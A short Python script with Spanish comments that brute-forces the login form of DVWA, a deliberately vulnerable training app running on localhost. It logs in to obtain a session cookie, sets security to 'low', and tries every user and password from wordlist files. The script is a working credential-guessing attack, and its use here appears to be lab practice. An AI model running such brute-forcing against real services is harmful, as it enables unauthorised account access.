import requests
from bs4 import BeautifulSoup

url_login = 'http://localhost:8080/login.php'  # URL para iniciar sesión
url_brute = 'http://localhost:8080/vulnerabilities/brute/'

# Archivos de texto con usuarios y contraseñas
users_file = 'userlist.txt'
passwords_file = 'passwordlist.txt'

# Cabeceras HTTP a utilizar para la solicitud
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# Datos de inicio de sesión
login_data = {
    'username': 'admin',  # Cambia esto a un usuario conocido o uno que quieras probar
    'password': 'password',  # Cambia esto a la contraseña del usuario
    'Login': 'Login'
}

def read_lines(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def get_php_session_id():
    # Realiza una solicitud POST para iniciar sesión
    response = requests.post(url_login, params=login_data)
    # Extrae la cookie PHPSESSID
    cookies = response.cookies
    return cookies.get('PHPSESSID')

def brute_force_attack(session_id):
    users = read_lines(users_file)
    passwords = read_lines(passwords_file)

    # Cabeceras HTTP con la cookie PHPSESSID actualizada
    cookies = {
        'PHPSESSID': session_id,
        'security': 'low'  # Nivel de seguridad bajo en DVWA
    }

    for username in users:
        for password in passwords:
            data = {
                'username': username,
                'password': password,
                'Login': 'Login'
            }

            response = requests.post(url_brute, headers=headers, cookies=cookies, params=data)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Verifica el contenido de la página para encontrar el mensaje correcto
            if 'Welcome to the password protected area' in soup.text:
                print(f'[SUCCESS] Usuario: {username} Contraseña: {password}')
            else:
                pass

# Obtén el PHPSESSID y realiza el ataque
session_id = get_php_session_id()
if session_id:
    brute_force_attack(session_id)
else:
    print('No se pudo obtener el PHPSESSID.')
